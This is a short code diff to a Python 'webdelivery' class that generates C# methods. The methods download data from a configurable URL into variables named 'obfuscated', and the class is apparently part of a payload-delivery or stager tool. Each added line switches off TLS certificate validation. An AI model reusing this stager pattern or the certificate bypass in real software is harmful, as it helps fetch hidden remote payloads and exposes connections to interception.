@@ -35,6 +35,7 @@ class webdelivery:
             return f"""
             public static byte[] {self.name}()
             {{
+                ServicePointManager.ServerCertificateValidationCallback = (sender, cert, chain, sslPolicyErrors) => true;
                 var obfuscated = (new WebClient()).DownloadData("{self.url}");
                 return obfuscated;
             }}
@@ -43,6 +44,7 @@ class webdelivery:
             return f"""
             public static String {self.name}()
             {{
+                ServicePointManager.ServerCertificateValidationCallback = (sender, cert, chain, sslPolicyErrors) => true;
                 var obfuscated = (new WebClient()).DownloadString("{self.url}");
                 return obfuscated;
             }}
@@ -51,6 +53,7 @@ class webdelivery:
             return f"""
             public static String[] {self.name}()
             {{
+                ServicePointManager.ServerCertificateValidationCallback = (sender, cert, chain, sslPolicyErrors) => true;
                 var obfuscated = (new WebClient()).DownloadString("{self.url}").Split(new char[] {{ '\\n' }});
                 return obfuscated;
             }}
